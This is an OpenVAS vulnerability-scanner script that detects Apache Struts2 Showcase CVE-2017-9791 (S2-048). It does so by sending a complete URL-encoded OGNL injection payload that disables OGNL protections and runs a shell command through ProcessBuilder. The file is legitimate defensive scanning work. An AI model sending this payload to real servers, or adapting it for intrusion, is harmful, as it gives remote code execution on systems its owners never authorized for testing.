###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts2_showcase_remote_code_exec_vuln.nasl 13679 2019-02-15 08:20:11Z cfischer $
#
# Apache Struts2 Showcase Remote Code Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811309");
  script_version("$Revision: 13679 $");
  script_cve_id("CVE-2017-9791");
  script_bugtraq_id(99484);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2017-07-10 10:54:29 +0530 (Mon, 10 Jul 2017)");
  script_name("Apache Struts2 Showcase Remote Code Execution Vulnerability");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://www.checkpoint.com/defense/advisories/public/2017/cpai-2017-0558.html");
  script_xref(name:"URL", value:"http://struts.apache.org/docs/s2-048.html");
  script_xref(name:"URL", value:"http://struts.apache.org/announce.html#a20170707");

  script_tag(name:"summary", value:"This host is running Apache Struts2 and
  is prone to remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Try to execute a command by sending a
  special crafted HTTP POST request.");

  script_tag(name:"insight", value:"The flaw exists when handling a malicious
  field value when using the Struts 2 Struts 1 plugin and it's a Struts 1 action
  and the value is a part of a message presented to the user, i.e. when using
  untrusted input as a part of the error message in the ActionMessage class.");

  script_tag(name:"impact", value:"Successfully exploiting these issues allow
  remote attackers to execute arbitrary code in the context of the affected
  application.");

  script_tag(name:"affected", value:"Apache Struts 2.3.x with Struts 1 plugin and Struts 1 action");

  script_tag(name:"solution", value:"As mitigation always use resource keys
  instead of passing a raw message to the ActionMessage as shown below, never
  pass a raw value directly.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port( default:8080 );
host = http_host_name( dont_add_port:TRUE );

foreach ext( make_list( "action", "do", "jsp" ) ) {
  exts = http_get_kb_file_extensions( port:port, host:host, ext:ext );
  if( exts && is_array( exts ) ) {
    found = TRUE;
    break;
  }
}

if( ! found ) exit( 0 );

cmds = exploit_commands();
foreach cmd ( keys( cmds ) )
{
  c  =  cmds[ cmd ];

  data = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D" +
         "@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%" +
         "3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23cont" +
         "ext%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%" +
         "29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphon" +
         "y.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPa" +
         "ckageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClass" +
         "es%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%2" +
         "9%29%29%29.%28%23cmd%3D%27" + c + "%27%29.%28%23iswin%3D%28@jav" +
         "a.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29." +
         "contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27" +
         "cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C" +
         "%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBui" +
         "lder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%" +
         "28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.s" +
         "truts2.ServletActionContext@getResponse%28%29.getOutputStream%2" +
         "8%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process." +
         "getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D" +
         "&age=123&__cheackbox_bustedBefore=true&description=123";

  url = "/struts2-showcase/integration/saveGangster.action";
  req = http_post_req( port:port, url:url, data:data,
                       add_headers:make_array('Content-Type', 'application/x-www-form-urlencoded'));
  recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if(egrep( pattern:cmd, string:recv))
  {
    report = 'It was possible to execute the command ' + cmds[ cmd ] +
             ' on the remote host.\n\nRequest:\n\n' + req +
             '\n\nResponse:\n\n' + recv;
    security_message( port:port, data:report );
    exit( 0 );
  }
}
